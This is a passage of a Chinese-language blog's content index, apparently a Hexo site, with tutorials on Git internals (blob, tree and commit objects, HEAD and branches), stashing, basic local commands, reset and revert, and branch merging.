src="18.png"></p><p>可以看到，这个文件也代表了一个对象，且这是一个称为 commit 类型的对象；文件内容保存了这次提交的一些信息，包括作者和提交者的基本信息，时间戳，提交的注释等，但<strong>最引人注目的还是其第一行有一串 hash 值，因为这个值正好对应了第二个蓝色框的那个 hash 值</strong>。我们查看第二个蓝色框文件：<br><img src="19.png"></p><p>可以看到这个文件也是一个对象，且这是一个称为 tree 类型的对象；文件的内容保存了之前看到的在 index 文件中记录的 hello 和 bye 对象的 hash 值，但是其第三行的信息更让人好奇，这行信息中的 hash 值正好对应了第一个蓝色框的那个 hash 值，而且其名称正好是文件 process ！！！可能聪明的你已经想到这个 tree 对象代表啥了，没错，就是一个文件夹的信息，那么按照我们的理解，这次提交的 working 对象的记录应该就记录在第一个蓝色框那个 tree 对象中了！！我们可以验证如下：<br><img src="20.png"></p><p>果然没毛病！！！</p><p>根据上述分析，我们可以通过图形将上述的层级关系描述如下：<br><img src="21.png"></p><p>可以看到总共有七个对象，其中有一个被废弃的 blob 对象，记录了一个暂存后被覆盖的信息。commit 对象直接指向代表项目根目录的 tree 对象，tree 对象再指向代表其子目录的 tree 对象和代表文件的 blob 对象。这样一个版本就生成了！！</p><p>可以观察到，在 refs/heads 文件夹下也有新的文件生成，也就是 master 文件，我们可以直接查看其内容：<br><img src="22.png"></p><p>里面恰好保存了代表我们刚刚 commit 对象的 hash 值。同样我们也可以查看 HEAD 这个文件中的内容：<br><img src="23.png"></p><p>而这个 HEAD 文件中正好保存了刚刚生成的 master 文件名。这其实就是我们所说的 HEAD 指针的概念，它总是指向当前分支的当前 commit 记录！！！这样我们分支的概念也就出来了！！！</p><p>假设我们修改 hello 文件和 working 文件，然后将新的更改作为第二次提交 commit 到 GIT 仓库，如下：<br><img src="24.png"></p><p><img src="25.png"></p><p>观察 .git/objects 文件夹下生成的文件：<br><img src="26.png"></p><p>一共生成了五个对象，一个 commit 对象（红色）、两个 tree 对象（蓝色）、两个 blob 对象（绿色）。这样就形成了一次新的提交记录，查看 refs/heads/master 中内容：<br><img src="27.png"></p><p>果然保存了刚刚第二次提交的 commit 对象的 hash 值。这样我们的对象关系如下：<br><img src="28.png"></p><p>可以看到我们第二次提交由于没有改变 bye 文件所以其依旧指向上一个版本 bye 的 blob 对象，而修改了的文件会生成新的 blob 对象，而不是仅仅保存了文件的差异，而是修改后的整个文件。</p><p>接下来我们再次修改 bye 文件，并提交记录：<br><img src="29.png"></p><p>你可以思考一下这次提交会生成几个对象，分别是什么？？可以查看下图寻找答案！<br><img src="30.png"></p><p>这次提交仅仅生成了三个对象，分别是一个 blob 对象（记录了更改后的 bye 文件内容）、一个 tree 对象（由于 bye 文件发生了改变，所以其所在目录要重新生成一个 tree 对象）和一个 commit 对象（代表第三次提交）。</p><hr><h1 id="GIT-分支管理好像很简单"><a href="#GIT-分支管理好像很简单" class="headerlink" title="GIT 分支管理好像很简单"></a>GIT 分支管理好像很简单</h1><p>通过上述的学习，基本上对于 GIT 底层的处理已经很清晰明了了，很多问题即使上述内容中没有讲到，但也应该可以很容易的想到答案。此处再讨论几个小问题：</p><p><strong>1、怎么理解 GIT 分支管理和 HEAD 指针？</strong><br>通过上述的讨论，可以知道所谓分支不过是一个指向 commit 对象的指针，这个指针就保存在 <strong>.git/refs/heads</strong> 文件夹中，每一个分支都是一个文件，其中文件名就是分支名，而文件内容就是该分支当前指向的 commit。而 HEAD 指针则指向当前工作的分支，其内容可以在 .git/HEAD 文件中看到，当 HEAD 指向某个分支时，这个文件就记录该分支的文件路径，也就是上述 <strong>.git/refs/heads</strong> 文件夹中的一个文件。所谓切换分支，也就是修改 HEAD 文件使其记录相关分支的路径名。</p><p><strong>2、使用 <code>git branch -D</code> 强行删除一个未合并的分支，会删掉其提交记录中对应的各种对象吗?</strong><br>根据第一点，我们可以知道分支不过相当于一个指针罢了，而在删除分支时，只会删除代表该分支的指针，而不会删除其指向的值，所以提交记录中的各种对象是不会被删除的。通过某些操作，我们甚至可以直接恢复该分支和删除之前已经提交的内容。</p><p><strong>3、对于 fast forwad 合并，可以知道当前分支在合并前指向哪条 commit 吗？</strong><br>在 fast forward 合并的时候，GIT 并不会对此次合并生成一个提交记录，而是直接将当前分支的指针移动到目标分支指针指向的提交记录。那经过这次操作，我们好像并不知道在合并之前当前分支指向哪条提交记录，但其实对于 fast forward 合并操作，GIT 会在 .git 目录下生成一个 <strong>ORIG_HEAD</strong> 的文件，该文件中就记录了在合并前当前分支指针所指向的提交记录的 commit 对象 hash 值。<br>当然了，对于三路合并，虽然会生成一次提交记录，且在新的提交记录中会有两个 parent 的记录来保存合并前当前分支所指向的提交记录和目标分支所指向的提交记录，但其同样也会更新 ORIG_HEAD 文件。</p>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何用 GIT 暂存未提交的改动 （stashing 功能）</title>
      <link href="/2021/10/21/tools-git-stash/"/>
      <url>/2021/10/21/tools-git-stash/</url>
      
        <content type="html"><![CDATA[<p>今天在调试项目 BUG 的时候，在当前的分支上开发到一半，想切换到一个以前的分支看看以前的另外一个版本有没有跟这个 BUG 相关的处理（其实俺就是想抄一下作业，虽然并没有抄到，哭）。但是这时候我已经对当前的分支作了一些修改，但是这个 BUG 没修完也不能直接提交呀，但是切换分支的话我所有做的修改就都没了，怎么办怎么办怎么办。。。这时候发现了 GIT 的一个 <strong>stashing</strong> 功能，好家伙，这玩意可以暂存一些未提交的修改，接下来就看看怎么用这个命令吧~</p><hr><h2 id="stashing-功能简单演示"><a href="#stashing-功能简单演示" class="headerlink" title="stashing 功能简单演示"></a>stashing 功能简单演示</h2><p>假设目前我的项目有如下的修改：<br><img src="1.png"></p><p>这时候我要切换分支了，但是不想丢弃也不想提交这些改动怎么办，那就<strong>贮藏</strong> （stashing）起来，通过 <code>git stash</code> 命令或者 <code>git stash push</code> 即可完成我们的想法！！非常简单！！这时候再看仓库状态，我们的仓库是干净的了！！！这时候，完全可以切换到其他分支进行你想要进行的操作了。<br><img src="2.png"></p><p>要把贮藏的内容的还原到工作区也非常的简单，只要使用 <code>git stash pop</code> 命令即可，这命令将上一次 push 到贮藏栈里面的工作内容还原到工作区，同时将栈里面的包含上次贮藏工作内容的栈顶元素删除。<br><img src="3.png"></p><p>可以看到，贮藏栈里面已经没有内容了，而且我们工作区也恢复到上一次贮藏前的状态。</p><hr><h2 id="stashing-其他命令"><a href="#stashing-其他命令" class="headerlink" title="stashing 其他命令"></a>stashing 其他命令</h2><p>其实，GIT 的贮藏功能就是将这些改变放在一个栈上而已，可以通过 <code>git stash list</code> 查看。</p><p>在上述中，使用了 <code>git stash pop</code> 来还原最近的一次贮藏内容，还有其他办法吗？其实每一次贮藏都被会命名为  <code>stash@&#123;n&#125;</code>，其中 n 越大，代表该次贮藏越在栈的底部，也就是时间越早，那么我们可以通过 <code>git stash apply stash@&#123;n&#125;</code> 来还原某次贮藏内容，但是这个命令不会删除在贮藏栈里面的贮藏记录。如果想要删除的话，可以通过 <code>git stash drop stash@&#123;n&#125;</code> 来删除。</p>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIT 本地仓库基本使用</title>
      <link href="/2021/10/21/tools-git-local/"/>
      <url>/2021/10/21/tools-git-local/</url>
      
        <content type="html"><![CDATA[<h1 id="将项目初始化为-GIT-仓库"><a href="#将项目初始化为-GIT-仓库" class="headerlink" title="将项目初始化为 GIT 仓库"></a>将项目初始化为 GIT 仓库</h1><p>GIT 是一种项目版本管理工具，其本身可以相当于我们项目开发过程中的一种辅助性工具，为了使用这种工具我们首先需要将项目通过 GIT 提供的命令进行初始化。</p><p>要对现有的某个项目开始用 Git 管理，只需到此项目所在的目录，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>执行这条命令后，在项目的当前目录下会出现一个名为 .git 的目录，所有 GIT 需要的数据和资源都存放在这个目录中。后续对 GIT 的各种操作，其实主要就是读写这个目录下的内容。</p><hr><h1 id="GIT-初体验"><a href="#GIT-初体验" class="headerlink" title="GIT 初体验"></a>GIT 初体验</h1><p>在将我们的项目初始化为一个 GIT 仓库后，我们就可以通过 GIT 对项目中的文件进行版本管理了。现在在我们的项目中创建第一个文件 first ：<br>通过 GIT 提供的查看仓库状态的命令 <code>git status</code> 可以查看创建这个文件后的仓库的状态：<br><img src="1.png"></p><p>可以发现 GIT 提示我们有一个<strong>未追踪</strong>的文件 first。这个所谓未追踪的意思就是我们刚刚创建的文件还没有被纳入到 GIT 的版本管理中，在 GIT 仓库中创建一个新的文件，新文件的状态是<strong>未追踪的</strong>；同时，GIT 将这个文件放在一种称为<strong>工作区</strong>的区域中。</p><p>为了将我们创建的文件纳入到 GIT 中进行管理，首先需要执行命令 <code>git add &lt;file name&gt;</code>。通过这个命令，GIT 会将指定的文件从<strong>工作区</strong>转换到一种称为<strong>暂存区</strong>的区域中，而这个命令也会将属于<strong>未追踪状态</strong>的文件转换为<strong>已追踪状态</strong>。操作如下：<br><img src="2.png"></p><p>通过 <code>git add</code> 命令，我们创建的 first 文件从<strong>工作区</strong>转移到了<strong>暂存区</strong>，同时其文件状态也从<strong>未追踪</strong>转换成<strong>已追踪</strong>。但此时提示我们有改变在等待提交，意思就是在我们的<strong>暂存区</strong>中放了新修改的内容，正在等待提交。</p><p>通过命令 <code>git commit -m &quot;some comments&quot;</code>，可以将<strong>暂存区</strong>中的文件正式提交到 <strong>GIT 仓库</strong>中，这个区域也是正式的记录下我们项目的版本的地方，我们只需要将其理解成一个快照即可。操作如下：<br><img src="3.png"></p><p>可以看到在提交之后，GIT 提示了我们 working tree clean，即所有的修改都加入到了新的快照中。</p><h2 id="场景一：修改已经提交过的文件"><a href="#场景一：修改已经提交过的文件" class="headerlink" title="场景一：修改已经提交过的文件"></a>场景一：修改已经提交过的文件</h2><p>假设我们现在需要对上述已经提交过的 first 文件进行修改，会发生什么呢，假设我们在其中第二行加上一句话 “the first modification!!!”。操作如下：<br><img src="4.png"></p><p>对于<strong>已追踪</strong>的文件 first ，在对其进行修改后，GIT 给出提示这个文件已经被修改了，这是文件从 <strong>GIT 仓库</strong>中又转移到了<strong>工作区</strong>，根据上述的实验可以知道，在<strong>工作区</strong>中的文件想要加入到 <strong>GIT 仓库</strong>中，首先需要通过 <code>git add</code> 命令将其转移到<strong>暂存区</strong>，再通过 <code>git commit</code> 命令将其提交到 <strong>GIT 仓库</strong>中。</p><p>假设这次修改我们发现是没有必要的，想要撤销这次的修改，只需要执行指令 <code>git restore &lt;file name&gt;</code> 即可。演示如下：<br><img src="5.png"></p><p>可以看到这次修改被丢弃了，刚刚加入到 first 中的那一行也被丢弃了。</p><blockquote><p>[注]：对已经在 GIT 仓库中的文件进行修改，也会将文件从 <strong>GIT 仓库</strong>中转移到<strong>工作区</strong>，同时这个已追踪文件的文件状态会变成<strong>已修改</strong>（modifIed）。</p></blockquote><h2 id="场景二：修改暂存区中的文件"><a href="#场景二：修改暂存区中的文件" class="headerlink" title="场景二：修改暂存区中的文件"></a>场景二：修改暂存区中的文件</h2><p>在工作的时候，有一部工作已经完成，这时候就可以将工作区的文件通过 <code>git add </code> 命令加入到<strong>暂存区</strong>暂存起来，然后等工作都完成后一起提交到 <strong>GIT 仓库</strong>。假设在后续的开发中，发现已经暂存的文件需要进行修改，这时候会发生什么呢？</p><p>以下示例我们创建一个新的文件 second ，加入到<strong>暂存区</strong>，然后对其进行修改，查看 GIT 状态如下：<br><img src="6.png"></p><p>可见，修改<strong>暂存区</strong>中的内容，会将<strong>已追踪</strong>的文件设置为<strong>已修改</strong>状态，然后通过 <code>git status</code> 看到有两个 second 的记录，如图所示，这两个 second 的记录不是同一个记录。假设此时我们用 <code>git commit</code> 来提交记录，则在 <strong>GIT 仓库</strong>中记录的是<strong>暂存区</strong>中包含一行的 second 文件记录。假设我们要撤销<strong>已修改</strong>状态的 second，同样只需要用上节的 <code>git restore</code> 命令，但是想要撤销上一次加入到<strong>暂存区</strong>中的 second，则需要加入选项 <code>--staged</code>，操作如下：<br><img src="7.png"></p><h2 id="场景三：移除-GIT-仓库中的文件"><a href="#场景三：移除-GIT-仓库中的文件" class="headerlink" title="场景三：移除 GIT 仓库中的文件"></a>场景三：移除 GIT 仓库中的文件</h2><p>假设我们不小心把某些没必要的文件也提交到了 GIT 仓库中，这时候应该怎么移除掉这种记录呢？当前的状态如下，仅有一个 first 文件，接下来移除 GIT 仓库对其的记录：<br><img src="8.png"></p><p>为了移除 first 文件，运行 <code>git rm</code> 命令，该命令会将 GIT 仓库中的 first 标识为<strong>已删除</strong>状态，并且转移到<strong>暂存区</strong>，而且也将工作目录中的 first 删除掉（<code>git rm</code> 相当于 rm 后再 <code>git add</code>）。<br><img src="9.png"></p><p>假设我们只想要移除掉 GIT 仓库中对文件的目录，而不想删除掉工作目录中的文件，应该怎么办呢？？只需要执行命令 <code>git rm --cached</code> 即可。<br>该命令会将 GIT 仓库中 first 记录移除，也就是将 first 标记为<strong>已删除</strong>状态，但是不会删掉工作目录中的 first 文件，所以还会多出一个未追踪的 first 。如下所示：<br><img src="10.png"></p><h2 id="场景四：移动某个文件"><a href="#场景四：移动某个文件" class="headerlink" title="场景四：移动某个文件"></a>场景四：移动某个文件</h2><p>不像其他的 VCS 系统，Git 并不跟踪文件移动操作。如果在 Git 中重命名了某个文件，仓库中存储的元数据并不会体现出这是一次改名操作，不过 Git 非常聪明，它会推断出究竟发生了什么。使用 <code>git mv</code> 命令就可以移动某个文件了，操作如下：<br><img src="11.png"></p><p>可见使用 <code>git mv</code> 命令，first 文件被删除了，然后创建了 <code>first_name</code>，并且已经将其放入到了<strong>暂存区</strong>。所以 git mv 命令相当于如下三条命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv first first_rename</span><br><span class="line">git rm first</span><br><span class="line">git add first_rename</span><br></pre></td></tr></table></figure><h2 id="查看工作区、暂存区和-GIT-仓库的不同"><a href="#查看工作区、暂存区和-GIT-仓库的不同" class="headerlink" title="查看工作区、暂存区和 GIT 仓库的不同"></a>查看工作区、暂存区和 GIT 仓库的不同</h2><p>使用命令 <code>git status</code> 只能看到当前的项目文件级别的变更记录，如果想看到文件内容的不同，则需要 <code>git diff</code> 命令。</p><ul><li><code>git diff</code>：查看<strong>工作区</strong>相对于<strong>暂存区</strong>的变化</li><li><code>git diff --cached</code>：查看 <strong>暂存区</strong>相当于 <strong>GIT 仓库</strong>的变化</li></ul><p>假设在 GIT 仓库中已经有了一个 first 文件，其中仅有一行文本信息。当前整个项目文件夹的状态如下：<br><img src="12.png"></p><p>修改 first 文件，加入一行文本，查看状态如下：<br><img src="13.png"></p><p>可以看到，当使用 <code>git diff</code> 命令时，会将 first 文件中的信息打印出来，并且标示出<strong>工作区</strong>中当前 first 文件和暂存区中的区别；而使用 <code>git diff --cached</code> 没有打印出任何信息，这证明<strong>暂存区</strong>中的 first 文件和 <strong>GIT 仓库</strong>中的 first 文件是完全一样的。</p><p>通过 <code>git add </code> 命令将 first 文件保存到<strong>暂存区</strong>，然后查看不同：<br><img src="14.png"></p><p>这一次，工作区和暂存区相同了，而<strong>暂存区</strong>相对于 <strong>GIT 仓库</strong>有了变化。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 GIT 中有几个比较重要的概念，首先是文件所在的区域有三个，包括<strong>工作区</strong>、<strong>暂存区</strong>、<strong>GIT 仓库</strong>。然后是文件状态，<strong>未追踪</strong>（一般是新文件）、<strong>已追踪</strong>（显示或者隐式执行过 <code>git add</code> 的文件）、<strong>已修改</strong>（修改已追踪文件得到的状态）。通过下图可以很显然的展示出文件的变化过程：<br><img src="15.png"></p><hr><h1 id="GIT-仓库的版本回退"><a href="#GIT-仓库的版本回退" class="headerlink" title="GIT 仓库的版本回退"></a>GIT 仓库的版本回退</h1><blockquote><p>这一节主要讲 <code>git reset</code> 命令来进行版本回退、<code>git revert</code> 来撤销某次提交记录 </p></blockquote><p>GIT 作为版本管理工具，在每次提交的时候都会形成一个快照，那么怎么查看历史的提交记录呢？？对于历史的提交我们又可以做什么样的操作呢？？我们从一个例子说起。</p><p>假设有一个文件 profile 用来存放个人信息，为了更加方便的探索 GIT 提交记录，我们每次输入一行信息就提交一次，现在，我们分三次分别提交了姓名、邮箱和性别三条记录。profile 文件目前的状态如下：<br><img src="16.png"></p><p>通过 <code>git log</code> 命令，我们可以看到当前仓库的提交记录信息，总共有三次提交，对应了 profile 文件中的三行信息。<br>其实，GIT 会将每次提交用链表一样的结构保存起来，其中有个 <strong>HEAD 指针</strong>，总是指向当前分支的的当前记录结点。所以上述工程的提交记录树应该如下：<br><img src="17.png"></p><h2 id="场景一：最近一次提交记录的修改"><a href="#场景一：最近一次提交记录的修改" class="headerlink" title="场景一：最近一次提交记录的修改"></a>场景一：最近一次提交记录的修改</h2><p>假设我们发现最近的一次提交中写的 I’m a boy. 显得很不正式，需要进行修改，于是我们将 profile 的最后一行修改，如下：<br><img src="18.png"></p><p>profile 文件变成了<strong>已修改</strong>状态，如果我们用普通的 <code>git add</code> 和 <code>git commit -m</code> 命令的话，会生成一个新的提交记录，但这不是我们希望的，我们希望修改最近的一次提交记录即可。此时只需要运行 <code>git add</code> 和 <code>git commit --amend</code>，则 GIT 会弹出编辑 commit 信息的窗口，提示你是否需要修改 commit 信息，在保存退出后则将最近一次的提交记录所修改。其实这个命令的原理也就是将<strong>暂存区</strong>中的文件覆盖 <strong>GIT 仓库</strong>中最近的一次提交，这个操作可以让我们在提交后发现 commit 信息写错了的情况下修改 commit 信息（不修改文件，直接 <code>git commit --amend</code>，再修改 commit 信息即可）。<br><img src="19.png"></p><p>可以看到，对 profile 进行修改提交后，还是只有三条提交记录。<br><img src="20.png"></p><blockquote><p>[注]：假设在上面的操作后，我们发现修改后的也不对，需要回退到修改前的状态，可是，由于新的修改已经把之前的记录覆盖了，那么应该怎么做呢？<br>这时候可以先输入 <code>git reflog</code>，这个命令可以查看之前对于 HEAD 指针的操作记录，从而定位到某次提交的 sha-1 值，然后通过 <code>git reset</code> 命令则可以将 HEAD 指针指到修改前的提交记录上。</p></blockquote><p><img src="21.png"></p><p><img src="22.png"></p><p>可以看到我们重置了 HEAD 指针到修改前的提交记录。</p><h2 id="场景二：版本回退"><a href="#场景二：版本回退" class="headerlink" title="场景二：版本回退"></a>场景二：版本回退</h2><p>在上一小节中，我们已经体验过了使用 <code>git reset</code> 命令进行版本回退，其实 <strong>reset</strong> 就是重置的意思，所谓的版本回退就是将 HEAD 指针回退某一次提交记录。回到本节最开始的时候 profile 的状态：<br><img src="23.png"></p><p><code>git reset</code> 命令有三个重要的选项 </p><ul><li><code>--mixed</code>：默认情况，将<strong>暂存区</strong>和 <strong>GIT 仓库</strong>中的提交记录回退到某一个版本，不改变工作区内容。</li><li><code>--soft</code>：仅仅将 <strong>GIT 仓库</strong>中的提交记录回退到某一个版本，不改变工作区和暂存区的内容。</li><li><code>--hard</code>：谨慎使用，将<strong>工作区</strong>、<strong>暂存区</strong>和 <strong>GIT 仓库</strong>都回退到某一个版本，工作区中未提交的修改会丢失。<strong>由于该选项会丢失工作区中的内容，所以在使用前一定要很谨慎</strong>！！！</li></ul><p>假设我们给 profile 文件加入了地址信息：<br><img src="24.png"></p><p>此时我们还没有提交地址这条记录，但是我们不想要性别这条记录了，希望回退一个版本，这时候需要用到命令 <code>git reset</code>。<br>假如使用 <code>git reset --hard </code> 命令，则将我们工作区中关于地址的记录给弄丢了，这显然不是我们愿意看到的，所以可以使用 <code>--soft</code> 或者 <code>--mixed</code> 选项，如下：<br><img src="25.png"></p><p>这时候，我们仅需要在工作区将 profile 中关于性别那一行删除，然后再继续后续提交即可。<br><img src="26.png"></p><p>上面使用了命令<code>git reset --mixed HEAD^</code>，其中<code>HEAD^</code>表示将 HEAD 指针向上移动一个版本，如果是上上个版本则用 <code>HEAD^^</code>，依次类推。若要回退的版本很多，则可以使用 <code>HEAD~n</code> 来代替，其中 n 是指回退 n 个版本。</p><h2 id="场景三：撤销某次提交"><a href="#场景三：撤销某次提交" class="headerlink" title="场景三：撤销某次提交"></a>场景三：撤销某次提交</h2><p>在很多时候，我们并不需要把整个项目都往前回滚到一个时间点，而仅仅需要将以前某次的提交给它撤销了，这时候就要用到 <code>git revert</code> 命令，这个命令就相当于接着当前所有提交记录的一次提交，比如说上述我们希望把性别那次提交给撤销了，我们上小节是直接回滚到上一个版本来进行的，如果在性别那次提交后还有很多的提交记录，那么上述方法会丢弃所有这些记录。但是用 <code>git revert</code> 则可以对指定的某次提交进行撤销而不会发生上述情况，假设我们要撤销上面 profile 的最后一次提交：<br><img src="27.png"></p><p>可见，在 <code>git revert</code> 命令后，多了一个提交记录，这个提交记录就是将第三次提交撤销的提交记录。<br><img src="28.png"></p><hr><h1 id="GIT-分支管理"><a href="#GIT-分支管理" class="headerlink" title="GIT 分支管理"></a>GIT 分支管理</h1><p>有人把 Git 的分支模型称为“必杀技特性”，而正是因为它，将 Git 从版本控制系统家族里区分出来。Git 有何特别之处呢？Git 的分支可谓是难以置信的轻量级，它的新建操作几乎可以在瞬间完成，并且在不同分支间切换起来也差不多一样快。</p><h2 id="提交操作发生了什么？"><a href="#提交操作发生了什么？" class="headerlink" title="提交操作发生了什么？"></a>提交操作发生了什么？</h2><p><font color=red>首先要有一个概念，GIT 保存的不是各个文件之间的差异和变化量，而是通过压缩方式保存了一系列文件快照。其中每个文件的快照是一个称为 <strong>blob</strong> 的对象，而在提交后，这次提交的文件快照都用一个称为 <strong>tree</strong> 的对象（一个 <strong>tree</strong> 对象对应一个文件目录）索引，对应的提交也会用一个称为 <strong>commit</strong> 的对象来保存这次提交（包括指向 <strong>tree</strong> 对象的指针，本次提交的作者等相关附属信息，零个或多个指向该提交对象的父对象指针）。</font></p><p>假设在我们的工作目录中有三个文件，准备将他们暂存后提交。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add README test.rb LICENSE</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">&#x27;initial commit of my project&#x27;</span></span></span><br></pre></td></tr></table></figure><p>暂存操 <code>git add</code> 作会根据每个文件的内容计算校验和（sha-1算法），然后将这些校验和作为文件快照的名字保存到暂存区中（GIT 使用 blob 类型的对象存储这些快照）。当使用 <code>git commit</code> 新建一个提交对象前，GIT 会计算每一个子目录（本例子中就是根目录）的校验和，然后将这些目录保存为树（tree）对象。之后 Git 创建的提交对象，除了包含相关提交信息以外，还包含着指向这个树对象（项目根目录）的指针，如此它就可以在将来需要的时候，重现此次快照的内容了。现在，GIT 仓库中有五个对象：</p><ul><li>三个表示文件快照内容的 blob 对象</li><li>一个记录着目录树内容及其中各个文件对应 blob 对象索引的 tree 对象</li><li>一个包含指向 tree 对象（根目录）的索引和其他提交信息元数据的 commit 对象</li></ul><p>概念上看，仓库中各个对象保存的数据和关系看起来如图：<br><img src="29.png"></p><p>作些修改后再次提交，那么这次的提交对象会包含一个指向上次提交对象的指针（译注：即下图中的 <strong>parent</strong> 对象）。两次提交后，仓库历史会变成如下图所示：<br><img src="30.png"></p><h2 id="分支的本质"><a href="#分支的本质" class="headerlink" title="分支的本质"></a>分支的本质</h2><p>GIT 中分支，其实本质上仅仅是个指向 commit 对象的可变指针。在初始化一个项目后进行第一次提交的时候，GIT 会使用 master 作为默认分支的名字，在若干次提交后，其实已经有了一个指向最后一次提交对象的 master 分支，它在每次提交的时候都会自动向前移动。<br><img src="31.png"></p><p><font color=red>那么创建一个分支的时候会发生什么呢？</font>其实很简单，创建一个新的分支指针。比如新建一个 testing 分支，可以使用 <code>git branch</code> 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch testing</span></span><br></pre></td></tr></table></figure><p>这会在<strong>当前 commit 对象上</strong>新建一个分支指针。<br><img src="32.png"></p><p><font color=red>GIT 如何知道你在当前哪个分支上工作呢？</font>其实也是通过一个指针，上述的 HEAD 指针，这是一个指向你正在工作中的本地分支的指针，该指针指向的分支指针则表示当前所在的分支。使用 <code>git branch</code> 可以查看分支信息，其中当前分支的前面会有一个 <code>*</code> 号。<br><img src="33.png"></p><p>在上述的例子中，仅仅是新建了分支还没有切换分支，所以其关系如下：<br><img src="34.png"></p><p>要切换到其他分支，可以使用 <code>git checkout</code> 命令。假设我们要切换到 testing 分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout testing</span></span><br></pre></td></tr></table></figure><p><img src="35.png"></p><p>这样在不同分支上的提交则将产生分叉，HEAD 指针随着分支一起向前移动。</p><h2 id="分支合并"><a href="#分支合并" class="headerlink" title="分支合并"></a>分支合并</h2><p>假设我们的 GIT 仓库状态如下图所示，在主分支基础上创建了两个分支，然后分别进行了开发。<br><img src="36.png"></p><p>如果，hotfix 分支目前已经完成了开发，这时候就需要将其合并到主分支，然后进行发布。使用 <code>git merge &lt;branch&gt;</code> 命令合并，该命令将 branch 合并到当前上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout master<span class="comment"># 先切换到 master 分支</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge hotfix<span class="comment"># 将 hotfix 分支合并到当前的 master 分支</span></span></span><br><span class="line">Updating f42c576..3a0874c</span><br><span class="line">Fast forward</span><br><span class="line">README | 1 -</span><br><span class="line">1 files changed, 0 insertions(+), 1 deletions(-)</span><br></pre></td></tr></table></figure><p>注意到，合并时出现了 “Fast forward” 的提示。这是因为 master 分支所在的提交对象是要并入的 hotfix 分支的直接上游，GIT 只需要把 master 分支指针直接右移。换句话说，<strong>如果顺着一个分支走下去可以到达另一个分支的话，那么 Git 在合并两者时，只会简单地把指针右移，因为这种单线的历史分支不存在任何需要解决的分歧，所以这种合并过程可以称为快进（Fast forward）。</strong> 现在最新的修改已经在当前 master 分支所指向的提交对象中了。<br><img src="37.png"></p><p>这时候，hotfix 分支已经完成了自己的使命，可以删掉了。<br>首先我们可以使用 <code>git branch --merged</code> 来查看哪些分支已经被并入到了当前分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch --merged</span></span><br><span class="line">hotfix</span><br><span class="line">*master</span><br></pre></td></tr></table></figure><p>一般来说，列表中没有 <code>*</code> 的分支都可以使用 <code>git branch -d</code> 将其删除，因为其所作的修改已经并入到了当前的分支中了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d hotfix</span></span><br><span class="line">    Deleted branch hotfix (3a0874c).</span><br></pre></td></tr></table></figure><p>同样，也可以用 <code>git branch --no-merged</code> 来查看未合并的工作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch --no-merged</span></span><br><span class="line">iss53</span><br></pre></td></tr></table></figure><p>它会显示还未合并进来的分支。由于这些分支中还包含着尚未合并进来的工作成果，所以简单地用 <code>git branch -d</code> 删除该分支会提示错误，因为那样做会丢失数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d iss53</span></span><br><span class="line">    error: The branch &#x27;iss53&#x27; is not an ancestor of your current HEAD.</span><br><span class="line">    If you are sure you want to delete it, run &#x27;git branch -D iss53&#x27;.</span><br></pre></td></tr></table></figure><p>假设现在 iss53 也完成了开发任务，需要合并到主分支上：<br><img src="38.png"></p><p>实际操作同前面合并 hotfix 分支差不多，只需回到 master 分支，运行 git merge 命令指定要合并进来的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout master</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge iss53</span></span><br><span class="line">    Merge made by recursive.</span><br><span class="line">    README | 1 +</span><br><span class="line">    1 files changed, 1 insertions(+), 0 deletions(-)</span><br></pre></td></tr></table></figure><p>请注意，这次合并操作的底层实现，并不同于之前 hotfix 的并入方式。因为这次你的开发历史是从更早的地方开始分叉的。由于当前 master 分支所指向的提交对象（C4）并不是 iss53 分支的直接祖先，GIT 不得不进行一些额外处理。就此例而言，GIT会用两个分支的末端（C4 和 C5）以及它们的共同祖先（C2）进行一次简单的三方合并计算。如下图所示：<br><img src="39.png"></p><p>这次，GIT 